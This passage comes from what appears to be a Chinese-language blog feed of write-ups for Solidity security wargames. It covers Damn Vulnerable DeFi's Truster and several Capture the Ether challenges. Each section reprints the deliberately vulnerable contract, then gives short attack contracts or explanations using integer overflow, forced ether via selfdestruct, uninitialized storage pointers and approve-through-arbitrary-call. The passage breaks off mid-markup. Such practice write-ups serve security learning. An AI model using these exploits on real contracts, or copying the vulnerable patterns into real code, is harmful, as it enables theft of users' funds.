class="line">        <span class="comment">// Transfer ETH and handle control to receiver</span></span><br><span class="line">        SafeTransferLib.safeTransferETH(address(receiver), amount);</span><br><span class="line">        <span class="keyword">if</span>(receiver.onFlashLoan(</span><br><span class="line">            msg.sender,</span><br><span class="line">            ETH,</span><br><span class="line">            amount,</span><br><span class="line">            FIXED_FEE,</span><br><span class="line">            data</span><br><span class="line">        ) != CALLBACK_SUCCESS) &#123;</span><br><span class="line">            revert <span class="title function_">CallbackFailed</span><span class="params">()</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (address(this).balance &lt; balanceBefore + FIXED_FEE)</span><br><span class="line">            revert <span class="title function_">RepayFailed</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>观察到调用的外部合约是receiver(既传入的一个地址)，因此任何人都可以调用别人的合约来借贷，从而消耗别人的资金<br>若想一个交易内完成，则for循环10次即可</p><h2 id="Truster"><a href="#Truster" class="headerlink" title="Truster"></a>Truster</h2><p><a href="https://www.damnvulnerabledefi.xyz/challenges/truster/">题目源代码</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">漏洞在合约的flashloan函数中</span><br><span class="line">target.functionCall(data);</span><br></pre></td></tr></table></figure><p>仔细观察发现并无明显的漏洞，但要注意！！！每个合约在call时总会有可能approve一个账户来管理自己的token,从而造成漏洞<br>因此，我们就需要在flashloan的时候将target地址传入token的合约，data为approve,从而假装该合约授予你管理权限，从而将它的token全转走</p>]]></content>
      
      
      <categories>
          
          <category> -solidity靶场 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>capture刷题</title>
      <link href="/2023/03/28/solidity/%E6%9D%82%E4%B9%B1/capture%E5%88%B7%E9%A2%98/"/>
      <url>/2023/03/28/solidity/%E6%9D%82%E4%B9%B1/capture%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h2><h3 id="Token-sale"><a href="#Token-sale" class="headerlink" title="Token sale"></a>Token sale</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract TokenSaleChallenge &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    uint256 constant PRICE_PER_TOKEN = <span class="number">1</span> ether;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">TokenSaleChallenge</span><span class="params">(address _player)</span> public payable &#123;</span><br><span class="line">        require(msg.value == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">isComplete</span><span class="params">()</span> public view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance &lt; <span class="number">1</span> ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">buy</span><span class="params">(uint256 numTokens)</span> public payable &#123;</span><br><span class="line">        require(msg.value == numTokens * PRICE_PER_TOKEN);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] += numTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">sell</span><span class="params">(uint256 numTokens)</span> public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= numTokens);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -= numTokens;</span><br><span class="line">        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//答案</span></span><br><span class="line">contract attack&#123;</span><br><span class="line">    uint max=<span class="number">2</span>**<span class="number">256</span><span class="number">-1</span>;</span><br><span class="line">    uint public num1;</span><br><span class="line">    uint public num2;</span><br><span class="line">    function <span class="title function_">Attack</span><span class="params">()</span>external <span class="title function_">returns</span><span class="params">(uint result)</span>&#123;</span><br><span class="line">        num1=max/<span class="number">1</span> ether;</span><br><span class="line">        num2=(num1+<span class="number">1</span>)*<span class="number">1</span> ether;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Token-whale"><a href="#Token-whale" class="headerlink" title="Token whale"></a>Token whale</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract TokenWhaleChallenge &#123;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> public name = <span class="string">&quot;Simple ERC20 Token&quot;</span>;</span><br><span class="line">    <span class="built_in">string</span> public symbol = <span class="string">&quot;SET&quot;</span>;</span><br><span class="line">    uint8 public decimals = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">TokenWhaleChallenge</span><span class="params">(address _player)</span> public &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        totalSupply = <span class="number">1000</span>;</span><br><span class="line">        balanceOf[player] = <span class="number">1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">isComplete</span><span class="params">()</span> public view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> balanceOf[player] &gt;= <span class="number">1000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event <span class="title function_">Transfer</span><span class="params">(address indexed from, address indexed to, uint256 value)</span>;</span><br><span class="line"></span><br><span class="line">    function _transfer(address to, uint256 value) internal &#123;</span><br><span class="line">        balanceOf[msg.sender] -= value</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line"></span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(msg.sender, to, value)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address to, uint256 value)</span> public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= value);</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line"></span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event <span class="title function_">Approval</span><span class="params">(address indexed owner, address indexed spender, uint256 value)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(address spender, uint256 value)</span> public &#123;</span><br><span class="line">        allowance[msg.sender][spender] = value;</span><br><span class="line">        emit <span class="title function_">Approval</span><span class="params">(msg.sender, spender, value)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">transferFrom</span><span class="params">(address from, address to, uint256 value)</span> public &#123;</span><br><span class="line">        require(balanceOf[from] &gt;= value);</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line">        require(allowance[from][msg.sender] &gt;= value);</span><br><span class="line"></span><br><span class="line">        allowance[from][msg.sender] -= value;</span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是重点，减少的是msg.sender（就是调用者），所以会导致溢出，用第三个账户就会溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function _transfer(address to, uint256 value) internal &#123;</span><br><span class="line">        balanceOf[msg.sender] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line"></span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(msg.sender, to, value)</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract RetirementFundChallenge &#123;</span><br><span class="line">    uint256 startBalance;</span><br><span class="line">    address owner = msg.sender;</span><br><span class="line">    address beneficiary;</span><br><span class="line">    uint256 expiration = now + <span class="number">10</span> years;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">RetirementFundChallenge</span><span class="params">(address player)</span> public payable &#123;</span><br><span class="line">        require(msg.value == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        beneficiary = player;</span><br><span class="line">        startBalance = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">isComplete</span><span class="params">()</span> public view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">withdraw</span><span class="params">()</span> public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (now &lt; expiration) &#123;</span><br><span class="line">            <span class="comment">// early withdrawal incurs a 10% penalty</span></span><br><span class="line">            msg.sender.transfer(address(this).balance * <span class="number">9</span> / <span class="number">10</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            msg.sender.transfer(address(this).balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">collectPenalty</span><span class="params">()</span> public &#123;</span><br><span class="line">        require(msg.sender == beneficiary);</span><br><span class="line"></span><br><span class="line">        uint256 withdrawn = startBalance - address(this).balance;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// an early withdrawal occurred</span></span><br><span class="line">        require(withdrawn &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// penalty is what&#x27;s left</span></span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">        function <span class="title function_">Attack</span><span class="params">()</span> public payable &#123;</span><br><span class="line">        require(msg.value == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">attack</span><span class="params">(address addr)</span>public&#123;</span><br><span class="line">        selfdestruct(addr);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract MappingChallenge &#123;</span><br><span class="line">    <span class="type">bool</span> public isComplete;</span><br><span class="line">    uint256[] <span class="built_in">map</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">set</span><span class="params">(uint256 key, uint256 value)</span> public &#123;</span><br><span class="line">        <span class="comment">// Expand dynamic array as needed</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">map</span>.length &lt;= key) &#123;</span><br><span class="line">            <span class="built_in">map</span>.length = key + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">map</span>[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">get</span><span class="params">(uint256 key)</span> public view <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">map</span>[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只需使数组长度溢出就可以了</span></span><br><span class="line">contract A&#123;</span><br><span class="line">    bytes32 public a;</span><br><span class="line">    bytes32 public b;</span><br><span class="line">    bytes32 public c;</span><br><span class="line">    uint public n;</span><br><span class="line">    uint public g=<span class="number">100</span> ether;</span><br><span class="line">    uint public f=<span class="number">2</span>**<span class="number">256</span><span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//keccak256(bytes32(1))!=keccak256(abi.encodePacked(bytes32(1)))</span></span><br><span class="line">    function <span class="title function_">Mapping</span><span class="params">(address _salt,uint num)</span>external <span class="title function_">returns</span><span class="params">(bytes32)</span>&#123;<span class="comment">//_salt=1</span></span><br><span class="line">        a=keccak256(abi.encodePacked(bytes32(uint(uint160(_salt))),bytes32(num)));</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">UInt</span><span class="params">(uint num)</span>external <span class="title function_">returns</span><span class="params">(bytes32 )</span>&#123;</span><br><span class="line">        b=keccak256(abi.encodePacked(bytes32(num)));</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">     function <span class="title function_">ToBytes</span><span class="params">(uint _a)</span>external <span class="title function_">returns</span><span class="params">(bytes32)</span>&#123;</span><br><span class="line">         c=bytes32(_a);</span><br><span class="line">         <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">find</span><span class="params">()</span>external <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        n=<span class="number">2</span>**<span class="number">256</span><span class="number">-1</span>-uint(b)+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract DonationChallenge &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Donation</span> &#123;</span></span><br><span class="line">        uint256 timestamp;</span><br><span class="line">        uint256 etherAmount;</span><br><span class="line">    &#125;</span><br><span class="line">    Donation[] public donations;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">DonationChallenge</span><span class="params">()</span> public payable &#123;</span><br><span class="line">        require(msg.value == <span class="number">1</span> ether);</span><br><span class="line">        </span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function <span class="title function_">isComplete</span><span class="params">()</span> public view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">donate</span><span class="params">(uint256 etherAmount)</span> public payable &#123;</span><br><span class="line">        <span class="comment">// amount is in ether, but msg.value is in wei</span></span><br><span class="line">        uint256 scale = <span class="number">10</span>**<span class="number">18</span> * <span class="number">1</span> ether;</span><br><span class="line">        require(msg.value == etherAmount / scale);</span><br><span class="line"></span><br><span class="line">        Donation donation;</span><br><span class="line">        donation.timestamp = now;</span><br><span class="line">        donation.etherAmount = etherAmount;</span><br><span class="line"></span><br><span class="line">        donations.push(donation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">withdraw</span><span class="params">()</span> public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        </span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果在函数内用storage初始化，那么默认指针是指向slot0的，因此造成漏洞</span></span><br><span class="line">contract attack&#123;</span><br><span class="line">    uint public a;</span><br><span class="line">    uint256 scale = <span class="number">10</span>**<span class="number">18</span> * <span class="number">1</span> ether;</span><br><span class="line">    function <span class="title function_">Attack</span><span class="params">(uint etherAmount)</span>external&#123;</span><br><span class="line">        a=etherAmount/scale;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract FiftyYearsChallenge &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Contribution</span> &#123;</span></span><br><span class="line">        uint256 amount;</span><br><span class="line">        uint256 unlockTimestamp;</span><br><span class="line">    &#125;</span><br><span class="line">    Contribution[] public <span class="built_in">queue</span>;</span><br><span class="line">    uint256 public head;</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line">    function <span class="title function_">FiftyYearsChallenge</span><span class="params">(address player)</span> public payable &#123;</span><br><span class="line">        require(msg.value == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        owner = player;</span><br><span class="line">        <span class="built_in">queue</span>.push(Contribution(msg.value, now + <span class="number">50</span> years));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">isComplete</span><span class="params">()</span> public view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">upsert</span><span class="params">(uint256 index, uint256 timestamp)</span> public payable &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (index &gt;= head &amp;&amp; index &lt; <span class="built_in">queue</span>.length) &#123;</span><br><span class="line">            <span class="comment">// Update existing contribution amount without updating timestamp.</span></span><br><span class="line">            Contribution storage contribution = <span class="built_in">queue</span>[index];</span><br><span class="line">            contribution.amount += msg.value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Append a new contribution. Require that each contribution unlock</span></span><br><span class="line">            <span class="comment">// at least 1 day after the previous one.</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//关键地点，让timestamp溢出为0就可以完成，</span></span><br><span class="line">            require(timestamp &gt;= <span class="built_in">queue</span>[<span class="built_in">queue</span>.length - <span class="number">1</span>].unlockTimestamp + <span class="number">1</span> days);</span><br><span class="line"></span><br><span class="line">            contribution.amount = msg.value;</span><br><span class="line">            contribution.unlockTimestamp = timestamp;</span><br><span class="line">            <span class="built_in">queue</span>.push(contribution);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">withdraw</span><span class="params">(uint256 index)</span> public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        require(now &gt;= <span class="built_in">queue</span>[index].unlockTimestamp);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Withdraw this and any earlier contributions.</span></span><br><span class="line">        uint256 total = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (uint256 i = head; i &lt;= index; i++) &#123;</span><br><span class="line">            total += <span class="built_in">queue</span>[i].amount;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Reclaim storage.</span></span><br><span class="line">            delete <span class="built_in">queue</span>[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Move the head of the queue forward so we don&#x27;t have to loop over</span></span><br><span class="line">        <span class="comment">// already-withdrawn contributions.</span></span><br><span class="line">        head = index + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(total);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    uint public a=<span class="number">1</span> days;</span><br><span class="line">    uint public b=<span class="number">2</span>**<span class="number">256</span><span class="number">-1</span>;</span><br><span class="line">    uint public c;</span><br><span class="line">    constructor()public payable&#123;&#125;</span><br><span class="line">    function <span class="title function_">t</span><span class="params">()</span>public&#123;</span><br><span class="line">        c=b-a+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">over</span><span class="params">(address addr)</span>external&#123;</span><br><span class="line">        selfdestruct(addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//主要考察溢出</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Token-bank"><a href="#Token-bank" class="headerlink" title="Token bank"></a>Token bank</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span 